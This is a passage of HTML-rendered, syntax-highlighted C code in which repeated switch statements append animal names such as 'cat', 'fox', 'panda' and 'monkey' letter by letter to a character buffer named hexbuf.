hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"324\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"325\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"326\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"327\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"328\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"329\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"330\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"331\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"332\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"333\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"334\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"335\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"336\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"337\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"338\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"339\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"340\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"341\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"342\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"343\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"344\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"345\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"346\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"347\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"348\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"349\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"350\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"351\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"352\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"353\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"354\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"355\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"356\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"357\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>ii<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"358\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"359\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"360\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"361\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"362\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"363\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"364\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"365\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"366\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"367\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"368\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"369\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"370\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"371\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"372\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"373\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"374\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"375\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"376\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"377\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"378\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"379\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"380\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"381\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"382\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"383\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"384\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"385\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"386\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"387\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"388\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"389\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"390\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"391\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"392\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"393\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"394\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"395\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"396\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"397\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"398\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"399\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>jj<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"400\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"401\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"402\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"403\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"404\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"405\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"406\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"407\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"408\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"409\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"410\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"411\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"412\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"413\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"414\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"415\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"416\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"417\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"418\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"419\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"420\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"421\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"422\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">4</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"423\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"424\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'r'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"425\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"426\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"427\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"428\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"429\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"430\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">5</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"431\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'m'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"432\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"433\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"434\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'k'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"435\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'e'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"436\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'y'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"437\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"438\"></td><td><pre>        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"439\"></td><td><pre>            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"440\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"441\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>           <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span>kk<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"442\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"443\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'c'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"444\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"445\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'t'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"446\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"447\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"448\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"449\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"450\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'g'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"451\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"452\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"453\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'f'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"454\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'o'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"455\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'x'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"456\"></td><td><pre>            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"457\"></td><td><pre>        <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"458\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'p'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"459\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"460\"></td><td><pre>            hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'n'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"461\"></td><td><pre>             hexbuf<span class=\"token punctuation\">[</span>len<span class=\"token operator\">++</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token char\">'d'</span><span class=\"token 